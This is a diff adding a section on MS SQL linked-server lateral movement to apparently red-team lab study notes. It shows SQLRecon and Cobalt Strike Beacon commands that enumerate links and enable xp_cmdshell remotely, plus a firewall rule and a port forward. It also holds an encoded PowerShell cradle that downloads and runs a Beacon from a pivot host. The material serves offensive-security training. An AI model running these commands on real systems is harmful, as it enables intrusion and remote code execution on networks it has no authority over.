@@ -151,3 +151,66 @@ or
       beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
 
 What payload would you use if port 445 was closed?  Experiment with using the pivot listener here instead of SMB.
+
+## MS SQL Lateral Movement
+
+SQL Servers have a concept called "links", which allows a database instance to access data from an external source. MS SQL supports multiple sources, including other MS SQL Servers. These can also be practically anywhere: other domains, forests, or in the cloud. Discover any links that the current instance has:
+
+	SELECT srvname, srvproduct, rpcout FROM master..sysservers;
+
+The SQLRecon links module could also be used:
+
+	beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links
+
+Send SQL queries to linked servers using OpenQuery (double or single quotes is important!):
+
+	SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
+
+Or with SQLRecon:
+
+	beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"
+
+Check the xp_cmdshell status:
+
+	beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
+
+If xp_cmdshell is disabled, can't enable it by executing sp_configure. If RPC Out is enabled on the link (which is not by default), enable it (square brackets required):
+
+	EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
+	EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
+
+Query SQL-1 to find out if it has links too:
+
+	beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io
+
+Manually querying each server to find additional links can take a long time. Get-SQLServerLinkCrawl can automatically crawl all available links and shows information for each instance (e.g. version, who configured, whether admin, etc):
+
+	beacon> powershell Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
+
+Your privileges on the linked server depends on how the link is configured (in the example, any user who has public read access to the SQL-2 DB inherits sysadmin rights on SQL-1; we do not need to be sysadmin on SQL-2 first). The lwhoami module in SQLRecon can show similar information:
+
+	beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io
+
+To get a Beacon on SQL-1, repeat the same steps as above. However, SQL-1 may only be able to talk to SQL-2 and not to WKSTN-2 or any other machine in the DEV domain:
+
+	beacon> run hostname
+	sql-2
+	beacon> getuid
+	[*] You are DEV\mssql_svc (admin)
+	beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
+	beacon> rportfwd 8080 127.0.0.1 80
+
+Use xp_cmdshell on a linked server via OpenQuery (need to prepend a dummy query for it to work):
+
+	SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''')
+
+Or use the "AT" syntax:
+
+	EXEC('xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''') AT [sql-1.cyberbotic.io]
+
+SQLRecon also has a lxpcmd module. Once the payload has been executed, connect to the Beacon:
+
+	beacon> link sql-1.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
+	[+] established link to child beacon: 10.10.120.25
+
+
